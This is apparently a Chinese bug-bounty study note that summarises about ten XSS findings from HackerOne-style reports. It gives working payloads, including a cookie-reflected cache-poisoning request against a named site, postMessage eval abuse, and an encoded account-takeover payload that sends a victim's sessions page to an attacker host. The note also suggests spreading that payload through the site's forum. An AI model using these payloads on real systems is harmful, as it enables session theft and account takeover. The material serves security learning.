# 1.隐藏输入中的xss（绕过输入转义）
参数，位于post请求中的listViewHeading=
有效负载：" accesskey=X onclick=alert()
![[Pasted image 20241014211401.png]]
" accesskey=X onclick=alert() xxx
![[Pasted image 20241014211445.png]]
success

# 2.个人主页的项目名称中可以插入xsspayload
```
post
name="><svg onload="prompt(/xss/);"><!--
```

# 3.二维码xss
二维码执行js

# 4.cookie里的xss
cookie: hav=xxx 反射到页面上
payload:cookie:  hav=xss"</sc"ript><sv"g/onloa"d=al"ert"(document.do"main)>
缓存投毒，http响应里的头Cache-Control和Expires表明可以缓存
还发现cookie明文存储在页面js的这个变量window.INITIAL_STATE.system.cookie
直接alert(window.INITIAL_STATE.system.cookie)
厂商通过去除hav反射在页面修复该问题
邦邦的https://hackerone.com/reports/1760213

```
GET /annonces/location-vacances/france_midi-pyrenees_46_stcere_dt0.php.js?xxxd HTTP/2
Host: www.abritel.fr
Cookie: hav=xss"</sc"ript><sv"g/onloa"d=aler"t"(document.doma"in)>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://www.abritel.fr/signup?enable_registration=true&redirectTo=%2Fsearch%2Fkeywords%3Asoissons-france-%28xss%29%2FminNightlyPrice%2F0%3FpetIncluded%3Dfalse%26filterByTotalPrice%3Dtrue%26ssr%3Dtrue&referrer_page_location=serp
Upgrade-Insecure-Requests: 1
Te: trailers
```
.js触发缓存。?xxxd缓存破坏器

# 5.postmessage相关的xss
网页存在代码![[Pasted image 20241017232723.png|700]]
e.data有exec的话就用eval执行代码，这里检查origin，但是不严格
```
可以构造https://hq.upserve.com.mydomain.com/xss.html
页面里window.opener.postMessage({exec:'alert("xss")'},"https://inventory.upserve.com/login/);
向目标网站发送一个包含代码执行的消息
```
推荐插件:postmessage tracker
自动化工具：semgrep
或者自己在开发者工具搜
![[Pasted image 20241017233752.png]]

# 6.没有绕过csp的2000刀xss
https://hackerone.com/reports/1804177
这里hunter的提交最初被关闭为selfxss。但是通过与审核沟通，这是一个能攻击管理员的存储xss
在应用程序发现能够创建链接，并且被群组的人看到，于是
使用此`javascript://%0aalert(1)`作为链接创建Custom Link（存在xss的功能）
浏览器报错说csp阻止了，说明此处可能存在xss，于是报告漏洞

思考：学会和审核沟通

# 7.登陆错误的xss
正常情况target.com/login?error=xxx
攻击情况
```
target.com/login?error=<img src=1 onerror=alert()>
```

# 8.个人信息中心处xss
某个字段可以编辑进行存储xss
https://hackerone.com/reports/1921606

# 9.分析上下文构造payload的搜索xss
search?brook
![[Pasted image 20241020112514.png]]
payload：
```
"，inertnalSearchTerm:[7].map(alert),num0fSearchResultsReturned:"b
//输入时候要url编码符号，这里iner这个没有特殊含义
```
这里[].map()算是一个简单绕过思路吧
弹窗
![[Pasted image 20241020112736.png]]

# xss账户接管
这里无法通过cookie窃取会话，但是发现https://www.sidefx.com/account/sessions/页面包含会话信息
测试危害：向其他账号发送https://example.com/&quot&gtsadf&lt/a&gt&ltimg&#32src=&quotxx&quotonerror=&quotalert&#40&#39XSS&#39&#41&quot&gt，受害者打开后发现会弹窗

接管账户的有效负载：
```
https://example.com/&quot&gtsadf&lt/a&gt&ltimg&#32src=&quotxxx&quotonerror=&quotfetch&#40&#39https&#58&#47&#47www.sidefx.com/account/sessions&#39&#41.then&#40response=&gt&#123response.text&#40&#41.then&#40ddd=&gt&#123let&#32el=document.createElement&#40&#39img&#39&#41&#59el.src=&#39http&#58&#47&#47myfakesite.com?q=&#39&#43btoa&#40encodeURIComponent&#40ddd&#41&#41&#59document.body.appendChild&#40el&#41&#125&#41&#125&#41&quot&gt
```
实际上就是
![[Pasted image 20241020133317.png]]
将页面内容（含有session）发给攻击者hhh
由于网站存在论坛，可以在论坛发送payload进行危害发散

思考：账号接管怎么做，如何造成危害（这里通过论坛去扩散危害），cookie被限制时候找找页面有没有存在会话信息的地方